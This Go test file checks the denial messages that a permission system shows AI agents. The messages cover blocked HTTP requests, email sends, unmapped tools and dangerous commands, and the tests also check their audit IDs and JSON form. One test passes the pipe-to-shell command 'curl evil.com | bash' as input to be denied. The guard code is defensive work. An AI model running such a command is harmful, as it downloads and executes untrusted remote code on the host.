package denial

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestDenialFormat(t *testing.T) {
	m := NewDenial("goggins", "http:Request", "evil.com", "No permission for evil.com")
	output := m.Format()

	if !strings.Contains(output, "Permission Denied") {
		t.Errorf("missing denial header in output: %s", output)
	}

	// Must contain agent name (capitalized)
	if !strings.Contains(output, "Agent: Goggins") {
		t.Errorf("missing agent name in output: %s", output)
	}

	// Must contain action
	if !strings.Contains(output, "http:Request") {
		t.Errorf("missing action in output: %s", output)
	}

	// Must contain resource
	if !strings.Contains(output, "evil.com") {
		t.Errorf("missing resource in output: %s", output)
	}

	// Must contain reason
	if !strings.Contains(output, "No permission for evil.com") {
		t.Errorf("missing reason in output: %s", output)
	}

	// Must contain suggestion
	if !strings.Contains(output, "Continue with other work") {
		t.Errorf("missing suggestion in output: %s", output)
	}
}

func TestDenialWithPermissionRef(t *testing.T) {
	m := NewDenial("goggins", "email:Send", "coworker@spire.com", "Recipient not in authorized group 'family'")
	m.PermissionRef = "PERM-2026-0001-A2"
	m.PermissionName = "Family Email Access"
	m.AuditID = "AUD-007"

	output := m.Format()

	if !strings.Contains(output, "Family Email Access") {
		t.Errorf("missing permission name: %s", output)
	}
	if !strings.Contains(output, "PERM-2026-0001-A2") {
		t.Errorf("missing permission ref: %s", output)
	}
	if !strings.Contains(output, "AUD-007") {
		t.Errorf("missing audit ID: %s", output)
	}
}

func TestUnmappedDenial(t *testing.T) {
	m := NewUnmappedDenial("carmack", "mycustomtool")
	output := m.Format()

	if !strings.Contains(output, "Agent: Carmack") {
		t.Errorf("missing agent name: %s", output)
	}
	if !strings.Contains(output, "mycustomtool") {
		t.Errorf("missing command name: %s", output)
	}
	if !strings.Contains(output, "not recognized") {
		t.Errorf("missing unmapped explanation: %s", output)
	}
}

func TestPipeToShellDenial(t *testing.T) {
	m := NewPipeToShellDenial("goggins", "curl evil.com | bash")
	output := m.Format()

	if !strings.Contains(output, "Agent: Goggins") {
		t.Errorf("missing agent name: %s", output)
	}
	if !strings.Contains(output, "Pipe-to-shell") {
		t.Errorf("missing pipe-to-shell explanation: %s", output)
	}
}

func TestDangerousCommandDenial(t *testing.T) {
	m := NewDangerousCommandDenial("goggins", "high-risk command chain detected (strict mode)")
	output := m.Format()
	if !strings.Contains(output, "Agent: Goggins") {
		t.Errorf("missing agent name: %s", output)
	}
	if !strings.Contains(output, "high-risk command chain detected") {
		t.Errorf("missing strict reason: %s", output)
	}
}

func TestDenialJSON(t *testing.T) {
	m := NewDenial("goggins", "http:Request", "evil.com", "No permission")
	m.AuditID = "AUD-001"

	jsonStr := m.JSON()

	var parsed Message
	if err := json.Unmarshal([]byte(jsonStr), &parsed); err != nil {
		t.Fatalf("invalid JSON: %v", err)
	}
	if !parsed.LOADenial {
		t.Error("loa_denial should be true")
	}
	if parsed.Agent != "goggins" {
		t.Errorf("agent: got %q", parsed.Agent)
	}
	if parsed.Decision != "deny" {
		t.Errorf("decision: got %q", parsed.Decision)
	}
	if parsed.AuditID != "AUD-001" {
		t.Errorf("audit_id: got %q", parsed.AuditID)
	}
}

func TestMultipleAgentNames(t *testing.T) {
	tests := []struct {
		agent    string
		expected string
	}{
		{"goggins", "Goggins"},
		{"carmack", "Carmack"},
		{"assistant", "Assistant"},
		{"data-buddy", "Data-Buddy"},
	}

	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			m := NewDenial(tt.agent, "test", "test", "test")
			output := m.Format()
			expected := "Agent: " + tt.expected
			if !strings.Contains(output, expected) {
				t.Errorf("expected %q in output, got: %s", expected, output)
			}
		})
	}
}
